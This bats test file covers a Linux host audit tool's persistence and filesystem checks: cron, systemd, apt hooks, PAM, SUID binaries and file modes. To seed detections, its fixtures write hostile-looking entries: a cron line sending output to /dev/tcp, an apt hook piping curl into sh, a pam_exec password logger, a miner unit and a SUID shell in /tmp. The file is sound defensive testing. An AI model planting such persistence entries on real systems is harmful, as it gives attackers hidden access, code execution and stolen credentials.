#!/usr/bin/env bats
# Persistence detection (check-persistence.sh) and filesystem audit modules.

load test_helper

setup() {
  make_root
  use_fake_tools
}

# ------------------------------------------------------------ persistence

@test "persistence: suspicious systemd unit flagged, ordinary unit not" {
  run_audit --modules persistence
  [ "$(finding_sev PER-SYSTEMD-001)" = "high" ]
  evidence_has PER-SYSTEMD-001 evil.service
  refute evidence_has PER-SYSTEMD-001 ok.service
  evidence_has PER-SYSTEMD-002 ok.service
}

@test "persistence: reverse-shell cron job flagged; commented line and benign job are not" {
  run_audit --modules persistence
  evidence_has PER-CRON-002 backdoor
  refute evidence_has PER-CRON-002 commented
  refute evidence_has PER-CRON-002 benign
  evidence_has PER-CRON-001 benign
}

@test "persistence: cron excerpts never leak redacted secrets" {
  echo '* * * * * root /usr/bin/x --password=topsecret >/dev/tcp/1.2.3.4/9' >"${ROOT}/etc/cron.d/leaky"
  run_audit --modules persistence
  evidence_has PER-CRON-002 leaky
  refute grep -q topsecret "${OUT}"
}

@test "persistence: rc.local, ld.so.preload and shell profile hijacks" {
  run_audit --modules persistence
  has_finding PER-RC-001
  evidence_has PER-STARTUP-001 rc.local
  [ "$(finding_sev PER-LDPRE-001)" = "high" ]
  evidence_has PER-SHELL-001 ".bashrc"
}

@test "persistence: empty ld.so.preload and trivial rc.local are not findings" {
  : >"${ROOT}/etc/ld.so.preload"
  printf '#!/bin/sh\nexit 0\n' >"${ROOT}/etc/rc.local"
  run_audit --modules persistence
  no_finding PER-LDPRE-001
  no_finding PER-RC-001
  no_finding PER-STARTUP-001
}

@test "persistence: udev, apt hook, pam_exec and autostart detections" {
  mkdir -p "${ROOT}/etc/udev/rules.d" "${ROOT}/etc/apt/apt.conf.d" "${ROOT}/etc/pam.d" "${ROOT}/etc/xdg/autostart"
  echo 'ACTION=="add", RUN+="/tmp/x.sh"' >"${ROOT}/etc/udev/rules.d/99-x.rules"
  echo 'APT::Update::Post-Invoke { "curl http://x/y | sh"; };' >"${ROOT}/etc/apt/apt.conf.d/99hook"
  echo 'auth optional pam_exec.so /usr/local/bin/log-pw' >"${ROOT}/etc/pam.d/sshd"
  printf '[Desktop Entry]\nExec=/tmp/agent\n' >"${ROOT}/etc/xdg/autostart/x.desktop"
  run_audit --modules persistence
  has_finding PER-UDEV-001
  has_finding PER-APT-001
  has_finding PER-PAM-001
  has_finding PER-AUTOSTART-001
}

@test "persistence: user-level systemd units are inspected" {
  mkdir -p "${ROOT}/home/bob/.config/systemd/user"
  printf '[Service]\nExecStart=/dev/shm/miner\n' >"${ROOT}/home/bob/.config/systemd/user/m.service"
  run_audit --modules persistence
  evidence_has PER-SYSTEMD-001 m.service
}

@test "persistence: unreadable cron directory is a gap and scanning continues" {
  skip_if_root
  chmod 000 "${ROOT}/etc/cron.d"
  run_audit --modules persistence
  has_error PERM_DENIED
  has_finding PER-SYSTEMD-001
  chmod 755 "${ROOT}/etc/cron.d"
}

@test "persistence: a clean host yields no high-severity persistence findings" {
  rm -rf "${ROOT:?}/etc/cron.d" "${ROOT:?}/etc/systemd/system/evil.service" "${ROOT:?}/etc/rc.local" "${ROOT:?}/etc/ld.so.preload" "${ROOT:?}/home/alice/.bashrc"
  run_audit --modules persistence
  [ "$(json_py "[f['id'] for f in d['findings'] if f['severity'] in ('high','critical')]")" = "[]" ]
}

# ------------------------------------------------------------ filesystem

@test "filesystem: SUID/SGID inventory and classification" {
  run_audit --modules filesystem
  evidence_has FS-SUID-001 /usr/bin/su
  evidence_has FS-SUID-002 /usr/bin/find
  refute evidence_has FS-SUID-002 /usr/bin/su
  evidence_has FS-SUID-003 /usr/bin/mystery
  refute evidence_has FS-SUID-003 /usr/bin/su
}

@test "filesystem: SUID in a user-writable location is high" {
  cp "${ROOT}/usr/bin/mystery" "${ROOT}/tmp/rootsh"
  chmod 4755 "${ROOT}/tmp/rootsh"
  run_audit --modules filesystem
  evidence_has FS-SUID-002 /tmp/rootsh
}

@test "filesystem: SGID is detected as well as SUID" {
  chmod 2755 "${ROOT}/usr/bin/mystery"
  run_audit --modules filesystem
  evidence_has FS-SUID-001 /usr/bin/mystery
}

@test "filesystem: recently modified files respect --recent-days" {
  touch -t 200001010000 "${ROOT}/usr/bin/mystery"
  run_audit --modules filesystem
  refute evidence_has FS-RECENT-001 /usr/bin/mystery
  evidence_has FS-RECENT-001 /usr/bin/find
  evidence_has FS-RECENT-002 /etc/crontab
  touch -t 200001010000 "${ROOT}/usr/bin/find"
  run_audit --modules filesystem --recent-days 1
  refute evidence_has FS-RECENT-001 /usr/bin/find
}

@test "filesystem: executables in /tmp and deceptive names are flagged" {
  run_audit --modules filesystem
  [ "$(finding_sev FS-PERM-003)" = "high" ]
  evidence_has FS-PERM-003 /tmp/dropper
  refute evidence_has FS-PERM-003 "/tmp/..."
  evidence_has FS-HIDDEN-001 "/tmp/..."
}

@test "filesystem: world-writable files and directories without sticky bit" {
  chmod 666 "${ROOT}/etc/crontab"
  mkdir "${ROOT}/etc/open" "${ROOT}/etc/sticky"
  chmod 777 "${ROOT}/etc/open"
  chmod 1777 "${ROOT}/etc/sticky"
  run_audit --modules filesystem
  evidence_has FS-PERM-001 /etc/crontab
  evidence_has FS-PERM-002 /etc/open
  refute evidence_has FS-PERM-002 /etc/sticky
}

@test "filesystem: unsafe modes on sensitive files raise one finding at the worst severity" {
  chmod 666 "${ROOT}/etc/passwd"
  run_audit --modules filesystem
  [ "$(finding_sev FS-MODE-001)" = "high" ]
  evidence_has FS-MODE-001 /etc/passwd
  evidence_has FS-MODE-001 /etc/shadow
}

@test "filesystem: correct modes produce no FS-MODE finding" {
  chmod 640 "${ROOT}/etc/shadow"
  chmod 750 "${ROOT}/root"
  run_audit --modules filesystem
  no_finding FS-MODE-001
}

@test "filesystem: --fs-path restricts scanning and reports bad paths" {
  run_audit --modules filesystem --fs-path "${ROOT}/tmp"
  evidence_has FS-RECENT-003 /tmp/dropper
  no_finding FS-RECENT-001
  run_audit --modules filesystem --fs-path "${ROOT}/does-not-exist"
  has_error FS_PATH_MISSING
}

@test "filesystem: unreadable directories are a gap, not a failure" {
  skip_if_root
  mkdir "${ROOT}/etc/locked"
  chmod 000 "${ROOT}/etc/locked"
  run_audit --modules filesystem
  has_error PERM_DENIED
  has_finding FS-SUID-001
  chmod 755 "${ROOT}/etc/locked"
}

@test "filesystem: a near-empty tree produces inventory only" {
  make_root linux-root-min
  run_audit --modules filesystem --fs-path "${ROOT}"
  has_finding FS-SUID-001
  [ "$(json_py "[f['id'] for f in d['findings'] if f['severity'] != 'info' and f['id'] != 'FS-RECENT-002']")" = "[]" ]
}
